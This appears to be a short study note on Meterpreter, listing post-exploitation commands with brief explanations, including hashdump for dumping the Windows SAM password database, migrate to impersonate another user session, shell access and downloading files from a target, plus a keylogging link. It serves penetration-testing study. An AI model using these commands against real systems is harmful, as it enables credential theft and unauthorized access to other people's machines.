# Meterpreter

{% embed url="https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/" %}

{% embed url="https://www.offsec.com/metasploit-unleashed/about-meterpreter/" %}

### Meterpreter

#### Useful commands:

1. `?`&#x20;

* View a list of available commands

2. `help`

* Displays the help menu

3. `background`

* Sends the current Meterpreter session into the background, and returns to the _msf_ prompt
* Use the `session -i` command to get back to the Meterpreter session

4. `cat`, `cd`, `pwd`, `ls`

* Similar to the Linux command line

5. `hashdump`

* Dumps the contents of the _**SAM**_ database
* The Security Accounts Manager (SAM) is a database file in Windows that contains usernames and passwords

6. `shell`

* Presents a standard shell on the target system

7. `ps`

* List running processes

Eg. Find all processes running [`explorer.exe`](https://jarrettgxz-sec.gitbook.io/windows/general/explorer.exe)&#x20;

```sh
meterpreter> ps | grep "explorer.exe"
```

8. `migrate`

* Migrate to another process
* Useful for impersonating another user session

9. `download`

* To download a file from the remote machine
* Note the use of the double-slashes in the Windows path

```sh
meterpreter> download c:\\users\test\file.txt
```

### Keylogger

{% embed url="https://www.offsec.com/metasploit-unleashed/keylogging/" %}
